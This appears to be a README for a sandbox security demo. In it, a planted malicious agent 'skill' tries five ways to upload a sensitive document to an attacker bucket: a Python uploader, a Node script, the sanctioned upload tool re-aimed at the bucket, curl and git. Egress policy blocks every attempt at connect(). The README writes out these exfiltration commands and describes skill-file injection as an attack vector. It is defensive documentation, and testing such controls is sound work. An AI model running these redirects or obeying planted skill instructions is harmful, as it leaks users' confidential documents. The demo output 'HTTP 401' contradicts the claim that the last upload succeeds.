# Document exfiltration

A malicious downloaded "skill" tries to ship a sensitive document to
an attacker-controlled destination — five different ways, reusing only
legitimate tools. The boundary stops every one at `connect()`, keeps
the attacker's bucket at zero requests, and leaves the attempts on the
audit record. The one redirect that still works — the raw document to
the sanctioned results server — is shown to be a workflow mistake,
not exfiltration, and why that distinction holds is part of the story.

```text
the skill's ladder (all denied at connect())
  → python3 uploader        no Python in the image
  → own script on node-26   EACCES
  → sanctioned tool, re-aimed at the attacker bucket   EACCES
  → curl                    no curl in the image
  → git                     EACCES, both destinations

the one upload that works
  → raw document to the sanctioned results server, inside the perimeter
```

A [visual walkthrough](visual-demo.html) draws the same story as
figures: the ladder, the policy check, and the classification
argument. It is published on the documentation site.

This is one of three examples from the same incident family; the
others are [API key theft](../api-key-theft/README.md) and
[model escalation](../model-escalation/README.md).

## The threat

The API-key-theft example's villain was the model itself. This one's
villain is a supply-chain payload: a "skill" the user downloaded and
dropped into the agent's configuration. No public incident is being
replayed here — the scenario is constructed — but the vector class is
real: agent instruction files, command templates, and plugin
marketplaces are all channels through which a third party's text
becomes the agent's instructions.

The setup: the agent works on sensitive documents (analyze, summarize)
and must upload its results to a results server through a sanctioned
upload tool — a small Node script run with the one runtime the policy
allows to POST there. The malicious skill's goal is to redirect that
flow: upload the raw document to an attacker-controlled destination
instead of the summary to the results server.

The sanctioned upload tool takes a file and a destination URL as
parameters, on purpose. A hardened tool with a baked-in destination
would make a weaker story: the interesting question is what stops the
attacker when everything they reuse is legitimate — the binary, the
script, the file access — and only the destination is wrong.

## The skill's ladder

Everything the skill tries reduces to one move with fallbacks: reuse
what is legitimate and swap the parameters.

| The skill's reasoning | What runs | Outcome |
| --- | --- | --- |
| "I'll write a Python uploader" | `python3 ~/exfil.py` | no Python in the image (minimal image) |
| "I'll use the sanctioned runtime with my own script" | `node ~/exfil.mjs` to the attacker bucket | `EACCES` at `connect()` |
| "The tool is legit — I'll re-aim it at my bucket and send the source document" | `node ~/bin/upload-results.mjs <raw doc> <attacker URL>` | `EACCES` at `connect()` |
| "Maybe plain curl" | `command -v curl` | no curl in the image either |
| "Fine — git, then. I'll push the document to a repo" | `/usr/bin/git ls-remote` to the attacker bucket *and* the results server | denied at `connect()` both ways — the results-server entry names one binary: node-26 |

The third row is the story's heart. The attacker did everything right
by tool standards: the sanctioned binary, the sanctioned script, a
file the agent legitimately reads. The connection still dies, because
the policy grants *binary × endpoint* pairs, not endpoints, and not
tools. From the boundary's point of view the clever reuse and a
hand-rolled script look identical: the same binary, the same denied
destination, the same `transparent_tcp_policy_denied` audit line.

The Python row is a different layer: the sandbox image ships exactly
the runtimes the workload needs, and Python is not one of them.
Absence is convenient; the policy denial is the guarantee — an image
that did ship python3 still could not connect, because it matches no
policy entry.

The git row is the per-binary point made live. git is in the image,
and the dev policy pairs git with the GitHub endpoints — but the
results-server entry names exactly one binary, and git is not it. The
destination that answers node-26's POST refuses git's connection at
`connect()`: the policy grants *binary × endpoint* pairs, not
endpoints. And git's exit code alone cannot prove that denial — a
non-git destination also makes `ls-remote` fail. libcurl does not
surface the kernel's `EACCES`, so a policy denial renders as `Failed
to connect ... Could not connect to server`; the demo asserts that
connect-level failure against a results server the sanctioned flow
just showed answering, plus unchanged request counts. The audit entry
names the process that actually connected — git's HTTP helper,
`git-remote-http` — because the policy evaluates the exec chain: the
helper acts with git's rights, and the denial fired because no entry
pairs git with this endpoint.

## What the demo shows

| Act | Move replayed | Control demonstrated | Outcome |
| --- | --- | --- | --- |
| 1-2 | Sensitive documents, sanctioned tool, planted skill | (none — the victim's mistake, replayed) | All data synthetic; skill payload shown |
| 3 | The sanctioned flow | Sanctioned `binary × endpoint` | Summary uploaded; results server counts it |
| 4 | The skill's ladder | Per-binary, per-endpoint egress; minimal image | Denied at `connect()` (node: `EACCES`; git: libcurl connect failure); Python and curl absent; attacker count unchanged |
| 5 | — | Audit logging | `transparent_tcp_policy_denied` on the record |
| 6 | Same network, outside the boundary | Controlled-destination contrast | Host reaches both servers; sandbox reaches only the results endpoint |
| 6 (end) | The raw document to the *results server* | (none — and none needed; see below) | Upload succeeds, inside the perimeter |

## Running the demo

Prerequisites: the openshell-praxis all-in-one deployment on the
managed host (the local vLLM backend is *not* required for this
story), and a repo checkout as the OpenShell owner account that
manages sandboxes.

```console
./openshell/scripts/document-exfiltration-demo.sh
```

The script creates one sandbox (`doc-exfil-*`), plants synthetic
documents, the upload tool, and the malicious skill file
(`openshell/scripts/document-exfiltration-skill.md`), replays the
ladder, and destroys the sandbox on exit. Environment knobs:
`PRAXIS_PORT` (default `8080`), `RESULTS_PORT` (default `18081`), and
`ATTACKER_PORT` (default `18080`).

## What the transcript shows

Every sandbox-side attempt to reach the attacker bucket fails before
any byte leaves the host — synchronously, at `connect()`:

```text
connect error: EACCES
fatal: unable to access 'http://host.openshell.internal:18081/upload/': Failed to connect to host.openshell.internal:18081 after 4 ms: Could not connect to server
[1792462430.204] [sandbox] [OCSF ] [ocsf] NET:OPEN [MED] DENIED /usr/libexec/git-core/git-remote-http(0) -> host.openshell.internal:18081 [reason:transparent_tcp_policy_denied]
```

The Python fallback dies differently — no interpreter:

```text
/bin/bash: line 1: python3: command not found
```

Act 5 shows the enforcement side of the same attempts, and Act 6 the
contrast: host probes reach both servers (both count), the sandbox
never reaches the attacker bucket, and the final upload — raw
document, sanctioned destination — succeeds with the results server's
count incrementing:

```text
uploaded q4-restructuring.md: HTTP 401
```

## Why the redirect that works is not exfiltration

The uncomfortable act in the API-key-theft example was a real gap
(model selection was client-owned — closed since by the unified
catalog). This example's uncomfortable act is deliberately not one,
and the reason is worth stating as an operational rule:

**Summarization and security-level change are two separate
operations.** Summarizing a document is a transformation, not a
declassifier: whatever the source's security level is, the summary
inherits it. Changing that level is a separate operation — a review by
the people accountable for classification — and only after it may the
document move to a location of a different level.

In this deployment the agent's whole pipeline — read the source,
produce the summary, upload the result — happens at the source
documents' level. Nothing in it changes classification, so the results
server is rated for that level and operates at the sandbox's trust
level. The skill's one working redirect — the raw document to the
results server — moves data between two places at the same
classification: a workflow mistake (wrong file uploaded), not
exfiltration.

Two conditions keep that argument honest rather than hand-wavy:

- The allowlist forces endpoint classification; it does not verify it.
  "The results server is rated for this data" is an operational
  commitment. The boundary's actual guarantee is that data can only
  flow to endpoints an administrator classified as safe for the most
  sensitive data the sandbox may hold. Misclassify one endpoint and
  the guarantee silently weakens.
- A workflow that needs lower-level outputs (a public digest of
  private documents) is asking for a security-level change — exactly
  the operation that must not be the agent's unilateral decision. It
  needs the human review and, at the boundary, content inspection an
  execution boundary explicitly does not do.

What still deserves honesty, per the threat model's own line —
"Allowed endpoints can receive data from a malicious harness;
allowlists do not inspect model prompts" — is that method and
destination allowlisting do not inspect content:

- Bytes can ride a `GET` query string to an allowed read-only endpoint
  (`api.github.com`) as well as a `POST` body to the results server.
  Every reachable endpoint must be classified for the data, read-only
  or not.
- The gateway is an allowed endpoint for the sanctioned runtime, so
  document text pasted into a prompt crosses the boundary to it. Where
  it goes from there is defined by the gateway's upstream set — with
  the local vLLM backend selected, it stays on the host.
- The raw-document upload is at least observable: the results server
  counts it and the audit log records the connection, which is the
  detection story for a workflow anomaly, not a security event.

## Safety notes

- All workspace documents are synthetic and marked as demo data; the
  malicious skill file is an inert scaffold whose moves are replayed by
  the script, never executed by a live agent.
- The attacker destination is a host-side controlled server
  (`openshell/tests/controlled-http.py`); no request to any real
  external attacker destination is attempted. The git attempts target
  the controlled servers on the host and are denied at `connect()`
  before any packet; the demo makes no external requests of any kind.
- Every denial is asserted with the client-visible failure (node's
  `EACCES`; git's libcurl connect failure) plus an unchanged
  server-side request count — per the threat model's rule that failed
  commands alone are not denial evidence.
